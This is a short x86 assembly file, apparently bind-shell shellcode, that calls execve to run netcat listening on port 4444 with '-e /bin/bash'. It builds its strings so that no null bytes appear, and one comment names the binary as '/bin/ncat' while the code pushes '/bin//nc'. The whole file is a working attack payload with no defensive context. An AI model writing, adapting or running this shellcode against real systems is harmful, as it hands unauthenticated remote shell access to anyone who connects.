.section .text

.global main

main:

        xor %eax, %eax            #create null eax register
        push %eax                #push null eax register to the stack
       
         
        xor %ebx, %ebx
        
        #push  $0x74
        push  $0x636e2f2f
        push  $0x6e69622f  #/bin/ncat
        lea (%esp), %ebx

        mov $0x6c2d3434, %ecx      #-l + junk (avoiding 00)
        shr $16, %ecx
        push %ecx
        lea (%esp), %ecx
        
        mov $0x702d3434, %edx      #-p
        shr $16, %edx
        push %edx
        lea (%esp), %edx
        
        push %eax
        push $0X34343434
        lea (%esp), %edi  #4444 (port)

        mov $0x652d3434, %esi      #-e
        shr $16, %esi
        push %esi
        mov  %esp, %esi

        push $0x68        #/bin/bash
        push $0x7361622f
        push $0x6e69622f
        lea (%esp), %eax
        
        xor %ebp, %ebp
        push %ebp
        push %eax
        push %esi
        push %edi
        push %edx
        push %ecx
        push %ebx
        lea (%esp), %ecx

        
        xor %edx, %edx

        #RAZ registers
        xor %edi, %edi
        xor %esi, %esi
        xor %eax, %eax

        mov $11, %al              
        int $0x80              
